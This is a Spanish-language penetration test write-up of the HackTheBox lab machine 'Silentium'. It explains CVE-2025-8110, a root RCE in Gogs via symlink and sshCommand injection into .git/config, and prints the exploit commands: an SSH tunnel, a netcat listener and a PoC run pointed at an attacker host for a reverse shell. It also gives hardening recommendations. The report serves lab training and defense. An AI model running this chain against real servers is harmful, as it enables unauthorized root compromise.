01
NIST Phase 1 — Preparación / Alcance
Resumen Ejecutivo
Visión de alto nivel del incidente y su impacto

Se realizó un ejercicio de prueba de penetración contra el objetivo Silentium (plataforma HackTheBox), identificado bajo dirección IP de laboratorio. El objetivo era obtener acceso privilegiado completo al sistema.

Durante la evaluación se identificó y explotó exitosamente CVE-2025-8110, una vulnerabilidad crítica en Gogs (servicio de control de versiones) que permite la ejecución remota de comandos como usuario root mediante el abuso del mecanismo de symlinks en combinación con la sobrescritura del archivo .git/config y la inyección de un sshCommand malicioso.

🔴 Compromiso total: El atacante obtuvo una shell interactiva con privilegios de root, acceso irrestricto al sistema de archivos y capacidad de movimiento lateral. Los flags del sistema fueron recuperados con éxito.

La cadena de ataque inició desde un acceso de bajo privilegio legítimo (usuario ben) y escaló a root en un solo paso de explotación, sin requerir técnicas complejas de post-explotación adicionales.

04
NIST Phase 4 — Erradicación
CVE-2025-8110 — Análisis Técnico
Detalle de la vulnerabilidad explotada y mecánica del ataque
CVE-2025-8110
Gogs — Remote Code Execution via Symlink + .git/config sshCommand Injection
CRÍTICO RCE Gogs < patch API PutContents Pre-auth (cuenta requerida)

La vulnerabilidad permite a un usuario autenticado de Gogs lograr ejecución de código remoto con los privilegios del proceso Gogs (root en este caso) mediante la manipulación del flujo de trabajo de repositorios Git.

Vector técnico: La API PutContents permite subir un symlink que apunta a .git/config. Al sobrescribir ese archivo con una entrada sshCommand maliciosa, se inyecta un comando que se ejecuta cuando el servidor clona el repositorio vía SSH.

Flujo de explotación — 4 pasos
1
Preparación
Crear cuenta en Gogs (acceso web) y generar API token. Levantar tunnel SSH: ssh -N -L 13001:localhost:3001 ben@<TARGET>
2
Staging del payload
El PoC crea un repositorio vía API, sube un symlink malicious_link → .git/config y sobrescribe el config con una entrada sshCommand que apunta al listener del atacante.
3
Trigger
Al clonar el repositorio por SSH, Gogs ejecuta el sshCommand inyectado con los privilegios del proceso (root), disparando la reverse shell.
4
Recepción de shell
Netcat listener en el atacante recibe conexión entrante con uid=0(root) gid=0(root). Compromiso total confirmado.
bash · ejecución del exploit
# 1. Tunnel SSH hacia Gogs interno
ssh -N -L 13001:localhost:3001 ben@<TARGET_IP>

# 2. Listener en el atacante
nc -lvnp 4444

# 3. Ejecución del PoC CVE-2025-8110
python3 cve-2025-8110.py \
  -u http://127.0.0.1:13001 \
  -lh <ATTACKER_IP> \
  -lp 4444 \
  -U hacker \
  -P hacker123

# 4. Post-explotación
id            # → uid=0(root)
cat /root/root.txt
05
NIST Phase 4 — Erradicación / Hallazgos
Hallazgos de Seguridad
Vulnerabilidades identificadas ordenadas por severidad
🔴 Crítico
Gogs RCE — CVE-2025-8110
Ejecución remota de código como root mediante symlink injection en API PutContents y sshCommand malicioso en .git/config.
🔴 Crítico
Gogs corriendo como root
El proceso Gogs se ejecuta con UID 0, amplificando cualquier vulnerabilidad a un compromiso total inmediato sin necesidad de escalada adicional.
🟠 Alto
Credenciales SSH de bajo privilegio expuestas
El usuario ben cuenta con credenciales débiles o conocidas que permiten el acceso inicial al sistema, facilitando el pivoting a servicios internos.
🟠 Alto
Servicios internos sin autenticación fuerte
Flowise y Gogs accesibles en loopback sin segmentación adicional. Un único foothold es suficiente para alcanzar ambos servicios privilegiados.
🟡 Medio
Ausencia de monitoreo de túneles SSH
El port-forwarding SSH hacia puertos internos no fue detectado ni bloqueado, permitiendo al atacante alcanzar Gogs desde el exterior de forma transparente.
🟡 Medio
Flowise sin control de acceso robusto
El endpoint customMCP solo rechazó el ataque por un token inválido. La superficie de ataque del servicio existe y podría ser explotada con credenciales correctas.
06
NIST Phase 5 — Recuperación
Recomendaciones
Plan de acción priorizado para mitigación y hardening
P1
Parchear Gogs a versión no vulnerable
Aplicar el parche oficial que corrige CVE-2025-8110. Validar con prueba de concepto post-parche. Tiempo estimado: inmediato.
P1
Ejecutar Gogs y Flowise con usuarios dedicados sin privilegios
Crear usuarios del sistema gogs y flowise con UID no root. Usar systemd con User= y NoNewPrivileges=yes. Esto limita el blast radius de cualquier RCE a root.
P1
Rotar credenciales SSH del usuario ben
Invalidar contraseña actual, requerir autenticación por clave pública, deshabilitar autenticación por contraseña en /etc/ssh/sshd_config.
P2
Restringir port-forwarding SSH
Agregar AllowTcpForwarding no y PermitTunnel no en sshd_config para el usuario ben. Usar configuración por usuario con directiva Match.
P2
Segmentar servicios internos con firewall local
Usar iptables o nftables para restringir qué usuarios del sistema pueden conectarse a los puertos 3000 y 3001. Considerar network namespaces.
P2
Implementar autenticación robusta en Flowise
Rotar API keys y Bearer tokens de Flowise. Implementar rate limiting y logging de intentos de acceso al endpoint customMCP.
P3
Implementar monitoreo y alertas (SIEM)
Configurar alertas para: conexiones SSH salientes desde el servidor, port-forwarding activo, procesos shell lanzados por servicios web, y comandos id / whoami ejecutados.
P3
Auditoría periódica de CVEs en servicios autoalojados
Integrar herramientas como trivy, grype o osv-scanner en el pipeline de CI/CD para detectar vulnerabilidades conocidas en servicios desplegados.
07
NIST Phase 6 — Lecciones Aprendidas
Conclusiones
Síntesis y contexto del ejercicio de seguridad

El ejercicio demostró que una cadena de ataque corta y efectiva puede llevar al compromiso total de un sistema cuando se combinan: credenciales débiles en un servicio perimetral, servicios internos privilegiados no parcheados, y ausencia de controles de red internos.

Insight principal: El vector más peligroso no fue la vulnerabilidad en sí misma, sino el hecho de que el proceso Gogs corría como root. Sin ese error de configuración, el impacto de CVE-2025-8110 se hubiera limitado al usuario del servicio.

La evaluación también validó la metodología NIST SP 800-61 Rev.2 como marco estructurador: la fase de detección y análisis permitió identificar los servicios internos de forma ordenada, mientras que la fase de erradicación guió el análisis técnico del CVE con suficiente profundidad para documentar el mecanismo de explotación de forma reproducible.

Fortaleza identificada: Flowise resistió el ataque inicial por ausencia de token válido. Un control de acceso funcional, aunque básico, fue suficiente para bloquear un vector de ataque y forzar al atacante hacia un path alternativo.
